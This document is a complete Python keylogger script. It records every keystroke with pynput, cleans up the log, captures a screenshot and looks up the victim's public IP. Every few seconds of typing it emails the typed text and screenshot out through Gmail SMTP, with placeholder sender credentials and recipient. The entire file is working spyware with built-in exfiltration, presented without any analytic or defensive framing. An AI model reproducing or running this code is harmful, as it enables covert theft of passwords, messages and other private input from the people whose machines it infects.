import requests
import logging
import os
from pynput import keyboard
import time
import smtplib
import codecs
import socket
import pyautogui
###
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
###


# create log file
PATH = os.getcwd()
# remove file if program has already been executed - file exists
if os.path.exists(PATH + '\\log.txt'):
    os.remove(PATH + '\\log.txt')
log_file = os.path.join(PATH, 'log.txt')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# function to handle key press event
def on_press(key):
    global start_time
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

    elapsed_time = time.time() - start_time
    if elapsed_time > 6:  # seconds of TYPING time, not actual time.
        start_time = time.time()
        reformat_keylogger_file('log.txt')
        try:  # some ascii characters are not accepted.
            send_email('RECEIVANT EMAIL')
        except UnicodeEncodeError:
            pass
        # log file cleaning after email being sent
        with open(PATH + '\\log.txt', 'w') as file:
            file.write('')


def reformat_keylogger_file(file):
    # log file saves keys as:
    # 2023-04-19 16:53:05,751: K
    # one by one, so we clean the file

    with open(log_file, "r") as file:
        file_string = file.read()

    # keeping actual keys typed
    lines = file_string.splitlines()
    lines = [x[25:] for x in lines]

    # replace spaces with actual spaces, and dropping shifts, tabs, etc.
    lines = [word.replace("Key.space", " ") if "Key.space" in word else word for word in lines]
    lines = [word for word in lines if not word.startswith("Key.backspace")]
    lines = [word for word in lines if not word.startswith("Key.ctrl_l")]
    lines = [word for word in lines if not word.startswith("Key.shift")]
    lines = [word for word in lines if not word.startswith("Key.alt_l")]
    file_string = ''.join(lines)

    with codecs.open(log_file, "w", encoding="utf-8") as file:
        file.write(file_string)


def get_external_ip():
    response = requests.get('https://api.ipify.org?format=json')
    data = response.json()
    return data['ip']


def send_email(recipient):
    # Set up the connection to the email server
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_username = 'SENDER EMAIL'
    smtp_password = 'SENDER APP PASSWORD'
    ip = get_external_ip()

    with open(log_file, "r") as file:
        file_string = file.read()

    if os.path.exists(PATH + '\\s.png'):
        os.remove(PATH + '\\s.png')
    take_screenshot(PATH + '\\s')
    # Create the multipart message
    msg = MIMEMultipart()
    msg['From'] = smtp_username
    msg['To'] = recipient
    msg['Subject'] = f'User at address {ip} has typed:'

    # Attach the body text
    body = file_string
    msg.attach(MIMEText(body, 'plain'))

    # Attach the image

    image_path = PATH + '\\s.png' # Update with the actual path to the image file
    with open(image_path, 'rb') as image_file:
        img_data = image_file.read()
        image = MIMEImage(img_data, name='screenshot.png')
    msg.attach(image)

    # Connect to the SMTP server and send the email
    with smtplib.SMTP(smtp_server, smtp_port) as smtp:
        smtp.starttls()
        smtp.login(smtp_username, smtp_password)
        smtp.send_message(msg)



def take_screenshot(file):
    screenshot = pyautogui.screenshot()
    screenshot.save(file + '.png')


start_time = time.time()

# create keyboard listener - main forever loop
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
